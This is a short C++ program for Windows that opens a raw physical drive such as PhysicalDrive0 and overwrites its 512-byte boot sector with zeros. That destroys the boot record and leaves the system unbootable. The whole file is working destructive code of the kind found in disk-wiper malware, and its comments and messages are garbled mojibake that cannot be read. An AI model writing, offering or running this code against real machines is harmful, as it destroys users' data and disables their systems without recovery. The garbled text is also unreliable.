#include <iostream>
#include <windows.h>

void wipeBootSector(const std::string& drive) {
    // ��������� ���� ��� ������
    HANDLE hDrive = CreateFile(
        drive.c_str(), // ��������, "\\\\.\\PhysicalDrive0"
        GENERIC_WRITE,  // ������� ��� ������
        0,             // ��� ����������� �������
        nullptr,       // ��� ��������� ������������
        OPEN_EXISTING, // ������� ������������ ����
        0,             // ��� �������������� ������
        nullptr        // ��� �������
    );

    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "������ �������� �����: " << GetLastError() << std::endl;
        return;
    }

    // ���������� 512 ���� �����
    char buffer[512] = {0};
    DWORD bytesWritten;

    BOOL result = WriteFile(hDrive, buffer, sizeof(buffer), &bytesWritten, nullptr);
    if (!result) {
        std::cerr << "������ ������ �� ����: " << GetLastError() << std::endl;
    } else {
        std::cout << "����������� ������ ������� ����." << std::endl;
    }

    // ��������� ���������� �����
    CloseHandle(hDrive);
}

int main() {
    std::string drive;
    std::cout << "������� ����� ����� (��������, \\\\.\\PhysicalDrive0): ";
    std::getline(std::cin, drive);

    wipeBootSector(drive);

    return 0;
}
